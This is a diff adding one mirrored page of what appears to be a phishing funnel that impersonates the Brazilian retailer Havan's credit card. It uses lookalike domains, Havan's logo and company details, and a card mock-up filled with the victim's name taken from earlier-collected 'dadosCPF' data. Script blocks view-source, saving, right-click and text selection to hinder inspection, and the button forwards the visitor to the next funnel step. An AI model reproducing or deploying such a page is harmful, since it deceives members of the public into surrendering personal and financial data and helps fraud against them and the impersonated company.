@@ -1,0 +1,405 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from hvcartoes.online/havan/9/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 19:11:13 GMT --><head>
+
+    
+    <!-- Meta Pixel Code -->
+    
+    
+    
+
+    
+    <!-- End Meta Pixel Code -->
+
+
+    <!-- Mirrored from proposta-aprovada.click/loading by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 01:26:04 GMT -->
+    <!-- Added by HTTrack -->
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
+  <link rel="dns-prefetch" href="//portalcliente.havan.com.br">
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+    <style>
+        .header {
+            background: white;
+            padding: 15px 0;
+            text-align: center;
+            border-bottom: 3px solid #002279;
+        }
+
+        .main-content {
+            max-width: 600px;
+            background-color: white;
+            text-align: center;
+            padding: 1.25rem;
+            width: 100%;
+            box-sizing: border-box;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+        }
+
+        .color-options {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .color-options button {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: border 0.3s ease;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .footer p {
+            margin: 0;
+            /* Remove espaçamento extra entre as linhas do rodapé */
+        }
+
+        .color-options button:hover {
+            border-color: #6c63ff;
+        }
+
+        .color-options .selected {
+            border-color: #6c63ff;
+        }
+
+        .btn-custom {
+            background-color: #002279;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .cartao-container {
+            position: relative;
+            display: block;
+            width: 100%;
+            text-align: center;
+        }
+
+        .cartao {
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 1.6 / 1;
+            margin: 0 auto;
+            box-sizing: border-box;
+            border-radius: 15px;
+            background: var(--cartao-bg, #1e90ff);
+            color: white;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            font-family: Arial, sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .imagem-chip {
+            width: 35px;
+            position: absolute;
+            top: 40%;
+            left: 15px;
+            transform: translateY(-50%);
+        }
+
+        .imagem-lateral {
+            width: 30px;
+            position: absolute;
+            top: 40%;
+            left: 60px;
+            transform: translateY(-50%);
+        }
+
+        .top-left-text {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            width: 100px;
+        }
+
+        .top-right-img {
+            width: 50px;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            position: absolute;
+            bottom: 20px;
+            width: 90%;
+            left: 5%;
+        }
+
+        .titular {
+            text-align: left;
+        }
+
+        .valido {
+            text-align: right;
+        }
+
+        .titular p,
+        .valido p {
+            margin: 0;
+            font-size: 10px;
+            /* Tamanho da fonte para o texto */
+        }
+
+        .texto {
+            font-size: 14px;
+            /* Tamanho da fonte do texto "Titular do Cartão" */
+            text-transform: uppercase;
+            color: #ffffff;
+        }
+
+        body { overflow-x: hidden; }
+        .header img { max-width: 100%; height: auto; }
+
+        @media (max-width: 480px) {
+            .main-content { padding: 1rem; margin: 12px auto; }
+            .main-content h4 { font-size: 18px !important; }
+            .main-content p { font-size: 14px !important; }
+            .main-content h6 { font-size: 14px !important; }
+            .color-options button { width: 42px; height: 42px; }
+            .color-options { gap: 12px; }
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+    
+    
+    
+    <script defer src="/funil/fast.js"></script>
+</head>
+
+
+<!-- Google tag (gtag.js) -->
+
+
+<!-- TikTok Pixel Code Start -->
+
+<!-- TikTok Pixel Code End -->
+
+
+<body><div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="images/havan.png" alt="Imagem Centralizada">
+    </div>
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div class="main-content">
+            <h4 style="font-size: 20px;">Escolha o design do seu cartao</h4> <!-- Defina o tamanho aqui -->
+            <p style="font-size: 16px;">Selecione o estilo que mais combina com voce</p>
+            <h6 style="font-size: 16px;">Escolha a cor do seu cartao</h6>
+            <div class="color-options">
+                <button style="background-color: #000;" class="selected"></button>
+                <button style="background-color: #8420b3;"></button>
+                <button style="background-color: #002279;"></button>
+                <button style="background-color: #0454cc;"></button>
+            </div>
+            <div class="cartao-container">
+                <div class="cartao">
+                    <img src="images/hv-branco.png" alt="top-left-text" class="top-left-text" style="width: 50px !important;">
+                    <img src="images/Visa-logo-whitea91b.png" alt="Top-right logo" class="top-right-img">
+                    <img src="images/chip-1-logo-png-transparent.png" alt="Chip do Cartão" class="imagem-chip">
+                    <img src="images/Design-sem-nome.png" alt="Lateral logo" class="imagem-lateral">
+                    <div class="card-details">
+                        <div class="titular">
+                            <p class="texto">Titular do Cartao</p>
+                            <p id="titular-nome" style="font-size: 16px;">Nome Indisponível</p>
+                        </div>
+                        <div class="valido">
+                            <p class="texto">Valido Ate</p>
+                            <p id="valido-data" style="font-size: 14px;">01/32</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button class="btn-custom" onclick="redirecionarUtmsPage10()">CONTINUAR</button>
+        </div>
+    </div>
+
+    <script>
+        function redirecionarUtmsPage10() {
+            window.location.href = '../10/index.html' + window.location.search;
+        }
+    </script>
+    <!-- Footer -->
+    <style>
+        .styles_company__HQYS3 {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+            gap: 24px;
+            padding: 24px 16px 32px;
+        }
+
+        .styles_company__HQYS3 p {
+            font-size: .75rem;
+            line-height: 16px;
+            letter-spacing: 0;
+        }
+    </style>
+    <div class="styles_company__HQYS3">
+        <div>
+            <p class="styles_description__590uc">HAVAN S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro
+                II,
+                Brusque - SC, 88353-100</p>
+            <p class="styles_description__590uc">© <!-- -->2025<!-- --> - Todos os direitos reservados</p>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosCPF'));
+                if (dadosUsuario && dadosUsuario.nomeCompleto) {
+                    document.getElementById('titular-nome').innerText = dadosUsuario.nomeCompleto;
+                } else {
+                    document.getElementById('titular-nome').innerText = "Nome Indisponível";
+                }
+
+                const corSelecionada = localStorage.getItem('cartaoCor');
+                if (corSelecionada) {
+                    document.querySelector('.cartao').style.backgroundColor = corSelecionada;
+                    document.querySelector(`.color-options button[style*="${corSelecionada}"]`).classList.add('selected');
+                }
+            });
+
+            const colorOptions = document.querySelectorAll('.color-options button');
+            const cartao = document.querySelector('.cartao');
+
+            colorOptions.forEach((button, index) => {
+                button.addEventListener('click', () => {
+                    document.querySelector('.color-options .selected').classList.remove('selected');
+                    button.classList.add('selected');
+
+                    const colors = ['#000', '#8420b3', '#002279', '#0454cc'];
+                    const selectedColor = colors[index];
+
+                    cartao.style.background = selectedColor;
+                    localStorage.setItem('cartaoCor', selectedColor);
+                });
+            });
+        </script>
+
+</div></div></body><!-- Mirrored from proposta-aprovada.click/loading by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 01:26:11 GMT --><!-- Mirrored from hvcartoes.online/havan/9/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 19:11:14 GMT --></html>
